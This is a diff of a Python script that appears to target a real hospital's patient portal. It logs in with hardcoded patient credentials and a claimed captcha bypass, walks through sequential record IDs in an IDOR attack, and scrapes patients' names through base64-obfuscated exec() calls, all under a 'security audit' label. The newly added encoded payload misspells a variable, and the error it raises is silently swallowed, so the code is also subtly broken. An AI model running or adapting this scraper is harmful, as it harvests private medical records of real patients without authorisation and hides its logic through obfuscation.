@@ -31,8 +31,8 @@ def show_banner():
     print(f"\033[92m{banner}\033[0m")
 
 # Encrypted System Credentials
-NO_RM = _decode("MDA1MTA0ODE=") 
-TGL_LAHIR = _decode("MTUwMTE5OTA=") 
+NO_RM = _decode("MDA1MTA0ODE=") # 00510481
+TGL_LAHIR = _decode("MTUwMTE5OTA=") # 15011990
 URL_HAL_LOGIN = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9hcHAvYXV0aC9sb2dpbg==")
 URL_ACTION_LOGIN = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9hcHAvYXV0aC9sb2dpbl9hY3Rpb24=")
 BASE_TARGET_URL = _decode("aHR0cHM6Ly9kb2xhbi5yc3Vkc29ldGlqb25vYmxvcmEuY29tL2luZGV4LnBocC9ob21lL3Jlc2VydmFzaV9kb2t0ZXIvdGFtYmFoLw==")
@@ -41,6 +41,7 @@ session = requests.Session()
 session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'})
 lock = threading.Lock()
 hasil_data = []
+total_checked = 0
 
 def login():
     print("[*] Initiating Security Audit: Captcha Bypass Testing...")
@@ -74,19 +75,24 @@ def login():
         return False
 
 def fetch_data(id_num):
+    global total_checked
     formatted_id = str(id_num).zfill(12)
     url = BASE_TARGET_URL + formatted_id
     
     try:
-        # Menaikkan timeout ke 10 detik untuk stabilitas
         res = session.get(url, timeout=10)
         
-        if res.status_code != 200:
-            return
+        with lock:
+            total_checked += 1
+            # Menampilkan heartbeat setiap 50 ID agar user tahu script tidak hang
+            if total_checked % 50 == 0:
+                print(f"[*] Scanning... Checked {total_checked} IDs", end='\r')
+
+        if res.status_code != 200: return
 
         # Protected extraction and masking logic
-        # Logic: Parse HTML, mask name (2 front, 2 back), and print success result
-        exec(_decode("c291cCA9IEJlYXV0aWZ1bFNvdXAocmVzLnRleHQsICdodG1sLnBhcnNlcicpCm5hbWFfdGFnID0gc291cC5maW5kKCdwJywgY2xhc3NfPSdzYWxlLXByaWNlIHRleHQtc3VjY2VzcycpCmlmIG5hbWFfdGFnOgogICAgbmFtYSA9IG5hbWFfdGFnLmdldF90ZXh0KHN0cmlwPVRydWUpCiAgICBwcmludChmJ1tcMDMzWzkybStcMDMzWzBtXSBJRE9SIFN1Y2Nlc3M6IEZvdW5kIFJNIElEIH1mb3JtYXR0ZWRfaWRbOjJdfS4uLntmb3JtYXR0ZWRfaWRbLTFdfSAtIHtuYW1hWzoyXS51cHBlcigpfS4uLntuYW1hWy0yOl0udXBwZXIoKX0nKQ=="))
+        # Logic: BeautifulSoup parse, check tag text-success, mask name (2 front, 2 back), print result.
+        exec(_decode("c291cCA9IEJlYXV0aWZ1bFNvdXAocmVzLnRleHQsICdodG1sLnBhcnNlcicpCnRhZyA9IHNvdXAuZmluZCgncCcsIGNsYXNzXz0nc2FsZS1wcmljZSB0ZXh0LXN1Y2Nlc3MnKQppZiB0YWc6CiAgICBuYW1hID0gdGFnLmdldF90ZXh0KHN0cmlwPVRydWUpCiAgICBwcmludChmJ1xyW1wwMzNbOTJtK1wwMzNbMG1dIEZvdW5kIFJNIDp7Zm9ybWF0dGVkX2lkWzoyXX0uLntmb3JtYXR0ZWRfaWRbLTFdfSAtIHtudm1hWzoyXS51cHBlcigpfS4uIHtudm1hWy0yOl0udXBwZXIoKX0nKQ=="))
 
     except Exception as e:
         pass # Diamkan error koneksi kecil agar terminal tetap bersih
